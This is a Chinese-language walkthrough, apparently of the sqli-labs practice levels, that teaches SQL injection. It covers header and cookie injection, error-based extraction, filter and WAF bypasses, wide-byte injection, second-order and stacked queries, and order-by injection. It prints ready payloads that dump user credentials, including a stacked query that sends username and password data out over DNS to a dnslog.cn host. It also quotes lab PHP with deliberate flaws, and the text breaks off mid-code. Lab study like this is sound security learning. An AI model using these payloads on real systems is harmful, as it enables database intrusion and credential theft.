<h3 id="注入语句"><a href="#注入语句" class="headerlink" title="==注入语句=="></a>==注入语句==</h3><p>和get传参类型的语句大体相同，不同的地方有原来的id=1’由于get传参，抓包后自动写入uname/password=所以只需要写后面的admin’ 加上sql执行语句，原理一样，都是让系统执行完传参后继续把sql语句执行来回显  这里末尾注释符可用# </p>
<h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><p>post传参同样有三大类</p>
<h3 id="正误回显都有"><a href="#正误回显都有" class="headerlink" title="正误回显都有"></a>正误回显都有</h3><p>在burpsuit重发器里传参，<br><img src="https://img-blog.csdnimg.cn/4a405e6fb6bb451bb59e0111a93ebca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>红字部分即为注入语句，这里同样只展示最后一步 其他可按照get传参原理<br>只需改动小部分</p>
<h3 id="没正确回显-有报错回显"><a href="#没正确回显-有报错回显" class="headerlink" title="没正确回显 有报错回显"></a>没正确回显 有报错回显</h3><p><img src="https://img-blog.csdnimg.cn/facab42bd569421da49da39cac92470a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">这里我采用了辨识度更高的时间盲注 布尔盲注同样使用</p>
<h3 id="正错回显都没有"><a href="#正错回显都没有" class="headerlink" title="正错回显都没有"></a>正错回显都没有</h3><p>同上面直接时间盲注</p>
<h1 id="基于报错注入的各种传参方式"><a href="#基于报错注入的各种传参方式" class="headerlink" title="基于报错注入的各种传参方式"></a>基于报错注入的各种传参方式</h1><h2 id="先讲报错注入"><a href="#先讲报错注入" class="headerlink" title="==先讲报错注入=="></a>==先讲报错注入==</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml (XML_document, XPath_string, new_value)<br>替换查找到的符合条件的数据</p>
<h3 id="extactvalue"><a href="#extactvalue" class="headerlink" title="extactvalue"></a>extactvalue</h3><p>extractvalue(XML_document, XPath_string)<br>对XML文档进行查询的函数<br>当上述两个函数的xpath路径出错时，将XML_document报错返回回来<br>注意只能返回32个字符，后面的可用limit 等来限制返回的字符位置</p>
<h2 id="传参方式"><a href="#传参方式" class="headerlink" title="==传参方式=="></a>==传参方式==</h2><p>burp suite抓包后改相应数据</p>
<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
<h3 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h3><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><h3 id="base64加密的cookie注入"><a href="#base64加密的cookie注入" class="headerlink" title="base64加密的cookie注入"></a>base64加密的cookie注入</h3><p>将payload经base64加密后上传即可</p>
<h1 id="过滤注释的GET"><a href="#过滤注释的GET" class="headerlink" title="==过滤注释的GET=="></a>==过滤注释的GET==</h1><p>源码中过滤掉了注释符<br>注释符不能用了所以要在闭合上下功夫<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">' union select 1,group_concat(username),group_concat(password) from users where 1 or '</span><span class="number">1</span><span class="string">' = '</span><span class="number">1</span></span><br><span class="line">?id=<span class="number">-1</span><span class="string">' union select 1,(select group_concat(username) from users),'</span><span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<p>在末尾构造语句使闭合符号与语句组成一个不影响的语句<br>闭合方式多种多样</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="==二次注入=="></a>==二次注入==</h1><p>首先注册一个用户admin‘#<br>然后登录<br>修改密码<br>当你修改密码时 后台就执行了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> passwd=<span class="string">"新密码"</span> <span class="keyword">WHERE</span> username =<span class="string">' admin'</span> <span class="comment"># ' AND password='</span></span><br></pre></td></tr></table></figure></p>
<p>也就是<br>你用admin’#用户把admin用户的密码给改了</p>
<h1 id="过滤"><a href="#过滤" class="headerlink" title="==过滤=="></a>==过滤==</h1><h2 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h2><p>将payload里所有 and 和or<br>替换为 anandd 和 oorr<br>这里password也要变成passwoorrd</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(<span class="number">0x7e</span>,username,passwoorrd)) from users<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h2 id="过滤下的报错注入"><a href="#过滤下的报错注入" class="headerlink" title="过滤下的报错注入"></a>过滤下的报错注入</h2><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			/strip out <span class="keyword">OR</span> (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		/Strip out <span class="keyword">AND</span> (non <span class="keyword">case</span> sensitive)</span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		/strip out */</span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		/Strip out --</span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			/Strip out <span class="comment">#</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		/Strip out spaces</span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		/Strip out slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
<p>要用到||代替or information里的or要双写，用||‘1’=‘1来闭合<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='</span>security<span class="string">'))),1)||'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/41bb72de0481416fa30c710fad9b1959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><p><img src="https://img-blog.csdnimg.cn/73dc47cc35d046f39f35db64fba9fca9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">'||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>security<span class="string">'))),1)||'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>大小写select和union</p>
<h2 id="过滤下的时间盲注"><a href="#过滤下的时间盲注" class="headerlink" title="过滤下的时间盲注"></a>过滤下的时间盲注</h2><p>26到27关的a都是无法报错注入的<br>能用时间盲注过滤方法和不带a的关一样</p>
<h1 id="waf"><a href="#waf" class="headerlink" title="==waf=="></a>==waf==</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/ take the variables </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">	$hint=$qs;</span><br><span class="line">	$id1=java_implimentation($qs);</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	<span class="comment">//echo $id1;</span></span><br><span class="line">	whitelist($id1);&#125;</span><br><span class="line"></span><br><span class="line">/WAF implimentation with a whitelist approach..... only allows input to be Numeric.</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span></span>&#123;</span><br><span class="line">	$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">	<span class="keyword">if</span>($match)</span><br><span class="line">		&#123;<span class="comment">//echo "you are good";</span></span><br><span class="line">			<span class="comment">//return $match;</span></span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">			<span class="comment">//echo "you are bad";</span></span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br><span class="line">/ The <span class="function"><span class="keyword">function</span> <span class="title">below</span> <span class="title">immitates</span> <span class="title">the</span> <span class="title">behavior</span> <span class="title">of</span> <span class="title">parameters</span> <span class="title">when</span> <span class="title">subject</span> <span class="title">to</span> <span class="title">HPP</span> <span class="params">(HTTP Parameter Pollution)</span>.</span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span></span>&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line">	<span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">		$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>($val==<span class="string">"id"</span>)&#123;</span><br><span class="line">			$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> $id_value;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">break</span>;&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>java_implimentation模拟 tomcat 的查询函数处理<br>whitelist白名单过滤 检测到不符合规则就重定向<br>漏洞是whitelist只检测了java_implimentation输出的第一个参数$id_value<br>后面的逃过检测 注入点在后面<br><img src="https://img-blog.csdnimg.cn/cb26a817890f43dea574e56898b28098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="==宽字节注入=="></a>==宽字节注入==</h1><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。<br>urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br><img src="https://img-blog.csdnimg.cn/b1928e9bf27a4e4aaae0531adb797366.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h2 id="结束注释"><a href="#结束注释" class="headerlink" title="==结束注释=="></a>==结束注释==</h2><p>当转译为‘/时可用’/**/来==结束注释==</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="==堆叠注入=="></a>==堆叠注入==</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句<br>堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。<br>如下展示了堆叠注入插入了一个用户数据</p>
<p><img src="https://img-blog.csdnimg.cn/382b3c83943547868cbe1452eb266b25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/ba1f6818754e470bb14c6e4bbacded8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">同时也可以进行dnslog注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">';select load_file(concat('</span><span class="comment">//',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.au0mvd.dnslog.cn/1.txt'));--+</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://img-blog.csdnimg.cn/9b01f339db4641799cd67780c58d458e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">desc</span>查看表结构的详细信息</span><br><span class="line"><span class="selector-tag">desc</span> <span class="selector-tag">table_name</span>;</span><br><span class="line">此处desc是describe的缩写，用法: desc 表名/查询语句</span><br></pre></td></tr></table></figure>
<p>handler适用于select等过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">open</span>;</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">read</span> <span class="keyword">next</span>;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">handler</span> handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure>
<h1 id="二次注入进阶"><a href="#二次注入进阶" class="headerlink" title="二次注入进阶"></a>二次注入进阶</h1><h2 id="需成功登录才能二次注入"><a href="#需成功登录才能二次注入" class="headerlink" title="需成功登录才能二次注入"></a>需成功登录才能二次注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span><span class="params">($host,$dbuser,$dbpass, $dbname)</span></span>&#123;</span><br><span class="line">   <span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);</span><br><span class="line">   </span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[<span class="string">"login_user"</span>]);</span><br><span class="line">   $password = $_POST[<span class="string">"login_password"</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Check connection</span></span><br><span class="line">   <span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">       @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database ######: "</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="comment">/* execute multi query */</span></span><br><span class="line"> 	$sql = <span class="string">"SELECT * FROM users WHERE username='$username' and password='$password'"</span>;</span><br><span class="line">   <span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))</span><br><span class="line">   &#123;</span><br><span class="line">        <span class="comment">/* store first result set */</span></span><br><span class="line">      <span class="keyword">if</span>($result = @mysqli_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">	 <span class="keyword">if</span>($row = @mysqli_fetch_row($result))&#123;</span><br><span class="line">	    <span class="keyword">if</span> ($row[<span class="number">1</span>]) &#123;</span><br><span class="line">	       <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">else</span>&#123;</span><br><span class="line">	       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	 &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">else</span>  &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysqli_error($con1));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">   &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">	print_r(mysqli_error($con1));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里对username和password过滤不强<br>可通过万能密码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’ <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
<p> 登录<br> 接下来通过修改密码界面二次注入<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?PHP</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"Auth"</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>])) &#123;</span><br><span class="line">   		header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">	<span class="comment"># Validating the user input........</span></span><br><span class="line">	$username= $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">	$curr_pass= mysql_real_escape_string($_POST[<span class="string">'current_password'</span>]);<span class="comment">//原密码 还是万能密码绕过</span></span><br><span class="line">	$pass= mysql_real_escape_string($_POST[<span class="string">'password'</span>]);<span class="comment">//新密码</span></span><br><span class="line">	$re_pass= mysql_real_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">	<span class="keyword">if</span>($pass==$re_pass)&#123;	</span><br><span class="line">		$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span>;</span><br><span class="line">		$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">		$row = mysql_affected_rows();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">if</span>($row==<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="comment">//echo "Password successfully updated";</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/password-updated.jpg"&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			header(<span class="string">'Location: failed.php'</span>);</span><br><span class="line">			<span class="comment">//echo 'You tried to be smart, Try harder!!!! :( ';</span></span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Make sure New Password and Retype Password fields have same value"</span>;</span><br><span class="line">		header(<span class="string">'refresh:2, url=index.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	session_destroy();</span><br><span class="line">	setcookie(<span class="string">'Auth'</span>, <span class="number">1</span> , time()<span class="number">-3600</span>);</span><br><span class="line">	header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>他用户名通过session获取，所以无法更改其他用户</p>
<h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="==order by注入=="></a>==order by注入==</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br></pre></td></tr></table></figure>
<p>order by 与where差不多<br>但不同是order by不能使用union联合<br>其他都可 也比较灵活<br>从46到53关皆为order by注入</p>
<h1 id="限制次数的注入"><a href="#限制次数的注入" class="headerlink" title="限制次数的注入"></a>限制次数的注入</h1><p>从54关开始，限制了注入次数<br>一旦超过次数就会改变数据<br>一切又要重新开始<br><img src="https://img-blog.csdnimg.cn/f9b1e0f39b0347c28528953eed71b19b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3d5876f7879045899ce8af31d082f9b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/17eb5837dcf14d76bcd6f276ebccd83c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/1eda68e6677d43eca8c14b97cffbc769.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">58-62可以报错注入<br>从62关开始只能使用盲注<br>==id注入部分代码==<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">id注入部分代码</span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span 